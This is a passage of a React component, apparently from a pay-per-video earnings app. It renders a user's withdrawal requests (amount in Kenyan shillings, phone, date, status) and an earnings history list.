                <div className="flex items-start gap-3">
                  <div className="mt-0.5 grid size-9 shrink-0 place-items-center rounded-lg bg-secondary text-primary">
                    {isBank ? <Building2 className="size-4" /> : <Smartphone className="size-4" />}
                  </div>
                  <div>
                    <p className="font-bold text-base">{formatKes(row.amount_kes)}</p>
                    <p className="text-xs text-muted-foreground font-medium">
                      {row.phone} • {relativeDate(row.requested_at)}
                    </p>
                    {row.admin_note ? (
                      <p className="text-xs text-muted-foreground mt-0.5">Note: {row.admin_note}</p>
                    ) : null}
                  </div>
                </div>
                <Badge className={STATUS_STYLES[row.status] ?? ""}>{row.status}</Badge>
              </div>
            );
          })}
        </CardContent>
      </Card>

      {/* Earnings history */}
      <Card className="shadow-soft">
        <CardHeader>
          <CardTitle className="font-display">Earnings history</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-2">
            {earnings.length === 0 ? (
              <p className="text-sm text-muted-foreground">
                Watch your first video to start earning.
              </p>
            ) : null}
            {earnings.map((row, index) => (
              <div key={row.id}>
                {index > 0 ? <Separator className="my-2" /> : null}
                <div className="flex items-center justify-between gap-3">
                  <div>
                    <p className="text-sm font-medium capitalize">
                      {row.type.replace(/_/g, " ")}
                    </p>
                    <p className="text-xs text-muted-foreground">
                      {row.note ?? ""} {relativeDate(row.created_at)}
                    </p>
                  </div>
                  <span
                    className={`font-display font-bold ${
                      Number(row.amount_kes) < 0 ? "text-destructive" : "text-primary"
                    }`}
                  >
                    {Number(row.amount_kes) < 0 ? "" : "+"}
                    {formatKes(row.amount_kes)}
                  </span>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
